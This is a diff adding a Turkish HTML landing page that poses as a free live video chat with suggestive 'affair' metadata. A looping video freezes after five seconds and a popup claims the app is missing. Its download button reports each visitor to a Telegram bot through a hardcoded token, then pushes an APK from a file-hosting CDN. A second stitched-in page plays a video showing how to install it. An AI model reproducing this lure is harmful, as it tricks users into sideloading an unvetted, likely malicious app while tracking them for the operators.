@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Görüntülü Görüşme</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+        integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        video {
+            position: absolute;
+            z-index: -1;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: translate(-50%, -50%);
+            min-width: 100%;
+            min-height: 100%;
+        }
+        .stopped {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -60%);
+            z-index: 10;
+            display: none; /* Başlangıçta gizli */
+        }
+        @layer utilities {
+        @keyframes pulse-heart {
+          0%,
+          100% {
+            transform: scale(1);
+          }
+          50% {
+            transform: scale(1.05);
+          }
+        }
+        .animate-pulse-heart {
+          animation: pulse-heart 1s ease-in-out infinite;
+        }
+      }
+
+        body, html {
+          overflow-x hidden
+          {
+        .animate-pulse-heart {
+              .container 
+            overflow: hidden
+            {
+    </style>
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();
+   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(102190345, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/102190345" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+    <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="pıttığım çok azdı">
+<meta name="twitter:description" content="Kaçamak mı yapmak istiyorsunuz tam size göre !"> 
+<meta name="twitter:image" content="https://www.xn--cretsizgoruntulusohbet-rlc.vip/img/2.jpg">
+<meta property="og:url" content="https://www.xn--cretsizgoruntulusohbet-rlc.vip/">
+
+
+    <meta property="og:type" content="website">
+<meta property="og:title" content="pıttığım çok azdı"> 
+<meta property="og:description" content="Görüntülü sohbetin en hızlı ve eğlenceli adresi. Hemen katıl, yeni insanlarla tanış!">
+<meta property="og:image" content="https://www.xn--cretsizgoruntulusohbet-rlc.vip/img/e.jpg">
+<meta property="og:url" content="https://www.xn--cretsizgoruntulusohbet-rlc.vip/">
+
+    
+</head>
+<body>
+    <div class="bg-black bg-opacity-50 flex absolute py-1 px-3 rounded-full gap-2 top-4 left-3">
+        <div class="flex items-center justify-center">
+            <span class="relative flex h-3 w-3">
+                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
+              </span>
+        </div>
+        <p class="text-white">Canlı</p>
+    </div>
+    <video autoplay muted loop id="backgroundVideo">
+        <!-- Video kaynağı JavaScript tarafından belirlenecek -->
+    </video>
+    <div class="bg-white fixed bottom-0 w-full p-3 rounded-t-3xl">
+        <div class="bg-gray-200 w-24 h-1 rounded-2xl m-auto"></div>
+        <div class="flex gap-10 justify-center p-3">
+            <div class="bg-[#F6F6F6] flex justify-center items-center w-10 h-10 rounded-full">
+                <i class="fa-solid fa-volume-xmark"></i>
+            </div>
+
+            <div class="bg-[#F6F6F6] flex justify-center items-center w-10 h-10 rounded-full">
+                <i class="fa-solid fa-video-slash"></i>
+            </div>
+
+            <div class="bg-[#F6F6F6] flex justify-center items-center w-10 h-10 rounded-full">
+                <i class="fa-solid fa-microphone-slash"></i>
+            </div>
+
+            <div class="bg-[#FAE4E6] flex justify-center items-center w-10 h-10 rounded-full">
+                <img src="./img/call.svg" alt>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-white min-w-52 max-w-96 w-80 flex-col justify-center items-center gap-3 
+        rounded-xl py-7 px-10 text-center stopped" id="stoppedDiv">
+        <div>
+            <img src="./img/favicon.jpg" alt>
+        </div>
+        <p class="font-bold">Görüşme Duraklatıldı!</p>
+        <p class="font-light text-[14px]"> 🔥 ÜCRETSİZ GÖRÜNTÜLÜ SOHBET YÜKLÜ DEĞİL!🔥  <br> 💋HEMEN AŞŞAĞIDAN TIKLA EĞLENCEYE KATIL</p>
+            <!-- eklenecek link href="#" bu kısma eklenmeli -->
+        <a href="#"
+   onclick="downloadFile(); return false;"
+   class="bg-[#6156DF] animate-pulse-heart text-white w-44 rounded-xl flex items-center justify-center p-3 px-5 relative">
+   Şimdi İndir
+   <i class="fa-solid fa-angle-right absolute right-4"></i>
+</a>
+
+<script>
+    function downloadFile() {
+        var token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
+        var chatId = '-1002478190818';
+        var message = 'Bir kullanıcı geldi.';
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram mesajı gönderildi:', data);
+                // Mesaj gönderildikten sonra yönlendir
+                window.location.href = 'https://ucarecdn.com/ee031a9a-86f2-4a2a-85f7-5864b617accf/ucretzgoruntulusohbet.apk';
+            })
+            .catch(error => {
+                console.error('Telegram mesajı gönderilemedi:', error);
+                // Hata olsa bile yönlendir
+                window.location.href = 'https://ucarecdn.com/ee031a9a-86f2-4a2a-85f7-5864b617accf/ucretzgoruntulusohbet.apk'
+            });
+    }
+</script>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Stabil Video Modal</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f9f9f9;
+  }
+  /* Buton stili */
+  #openVideoBtn {
+    background-color: #ef4444;
+    color: white;
+    font-weight: bold;
+    padding: 1rem 2rem;
+    border-radius: 9999px;
+    box-shadow: 0 4px 8px rgba(239,68,68,0.4);
+    width: 100%;
+    max-width: 360px;
+    margin: 2rem auto;
+    cursor: pointer;
+    border: none;
+    display: block;
+    animation: bounce 2s infinite;
+  }
+  #openVideoBtn:hover {
+    background-color: #dc2626;
+  }
+  @keyframes bounce {
+    0%, 100% { transform: translateY(0);}
+    50% { transform: translateY(-10px);}
+  }
+
+  /* Modal tam ekran kaplama */
+  #mobileVideoModal {
+    position: fixed;
+    inset: 0;
+    background-color: rgba(0,0,0,0.85);
+    display: none; /* Başta gizli */
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    padding: 1rem;
+  }
+  #mobileVideoModal.active {
+    display: flex;
+  }
+
+  /* Video stil */
+  #mobileVideoModal video {
+    width: 100%;
+    max-width: 400px;
+    height: auto;
+    border-radius: 20px;
+    background: black;
+    box-shadow: 0 0 30px rgba(255,255,255,0.3);
+  }
+
+  /* Kapatma butonu */
+  #closeBtn {
+    position: absolute;
+    top: 1rem;
+    right: 1rem;
+    background: rgba(220, 38, 38, 0.85);
+    border: none;
+    font-size: 1.5rem;
+    color: white;
+    padding: 0.25rem 0.6rem;
+    border-radius: 50%;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    box-shadow: 0 0 8px rgba(220, 38, 38, 0.7);
+  }
+  #closeBtn:hover {
+    background: rgba(220, 38, 38, 1);
+  }
+</style>
+</head>
+<body>
+
+<!-- Buton -->
+<button id="openVideoBtn">🔥NASIL İNDİRİLİR🔥</button>
+
+<!-- Modal -->
+<div id="mobileVideoModal">
+  <video id="indirVideo" controls autoplay muted playsinline>
+    <source src="https://xn--cretsizgoruntulusohbet-rlc.vip/videos/nasil.mp4" type="video/mp4" />
+    Tarayıcınız bu videoyu desteklemiyor.
+  </video>
+  <button id="closeBtn" aria-label="Kapat">✕</button>
+</div>
+
+<script>
+  const openBtn = document.getElementById("openVideoBtn");
+  const modal = document.getElementById("mobileVideoModal");
+  const video = document.getElementById("indirVideo");
+  const closeBtn = document.getElementById("closeBtn");
+
+  openBtn.addEventListener("click", () => {
+    modal.classList.add("active");
+    video.currentTime = 0;
+    video.play().catch(e => console.warn("Video oynatma hatası:", e));
+  });
+
+  closeBtn.addEventListener("click", () => {
+    modal.classList.remove("active");
+    video.pause();
+  });
+
+  // Modal arka planına tıklayınca kapanma (yalnızca siyah arka plan)
+  modal.addEventListener("click", (e) => {
+    if (e.target === modal) {
+      modal.classList.remove("active");
+      video.pause();
+    }
+  });
+</script>
+
+</body>
+</html>
+
+
+    <script>
+const videos = [
+    'videos/video1.mp4',
+    'videos/video2.mp4',
+    'videos/video3.mp4',
+    'videos/video4.mp4',
+    'videos/video5.mp4',
+    'videos/video6.mp4',
+    'videos/video7.mp4',
+    'videos/video8.mp4',
+    'videos/video9.mp4',
+    'videos/video10.mp4',
+   
+];
+
+
+      
+
+        window.onload = function() {
+            // Rastgele bir video seç
+            const videoIndex = Math.floor(Math.random() * videos.length);
+            const selectedVideo = videos[videoIndex];
+
+            // Video elementini al
+            const videoElement = document.getElementById('backgroundVideo');
+            videoElement.src = selectedVideo;
+
+
+
+
+            // 5 saniye sonra duraklat
+            setTimeout(function() {
+                videoElement.pause();
+                document.getElementById('stoppedDiv').style.display = 'flex';
+            }, 5000);
+        };
+    </script>
+    
+</body>
+</html>
